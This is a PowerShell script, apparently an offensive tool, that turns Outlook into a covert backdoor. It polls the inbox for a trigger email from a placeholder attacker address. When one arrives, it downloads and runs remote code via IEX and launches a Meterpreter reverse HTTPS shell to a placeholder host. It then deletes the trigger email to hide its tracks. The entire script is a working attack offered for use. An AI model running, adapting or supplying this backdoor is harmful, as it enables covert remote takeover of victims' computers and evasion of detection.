$AttackerEmail = "ATTACKEREMAIL@EMAIL.COM"
$TriggerWord = "EMAILSUBJECT"

While($True){
$olFolderInbox = 6
$outlook = new-object -com outlook.application;
$ns = $outlook.GetNameSpace("MAPI");
$inbox = $ns.GetDefaultFolder($olFolderInbox)
$Emails = $inbox.items
$Emails | foreach { 
if($_.SenderEmailAddress -match $AttackerEmail -and $_.subject -match $TriggerWord)
{Start-Job -ScriptBlock {$WebClientObject = New-Object Net.WebClient
IEX $WebClientObject.DownloadString('PAYLOAD_URL')
Invoke-Shellcode -Payload windows/meterpreter/reverse_https -LHOST xxx.xxx.xx.xxx -LPORT yyyy -Force}
}}

$Emails | foreach { 
if($_.SenderEmailAddress -match $AttackerEmail -and $_.subject -match $TriggerWord)
{$OutlookFolders = $outlook.Session.Folders.Item(1).Folders
$EmailInFolderToDelete = $outlook.Session.Folders.Item(1).Folders.Item("Inbox").Items
$EmailToDelete = $EmailInFolderToDelete | Where-Object {$_.Subject -eq $TriggerWord -and $_.SenderEmailAddress -eq $AttackerEmail}
$EmailToDelete.Delete() }

}
#This determines how often the script checks in. Lower sleep time == more noise  
Start-Sleep -s 10 





}
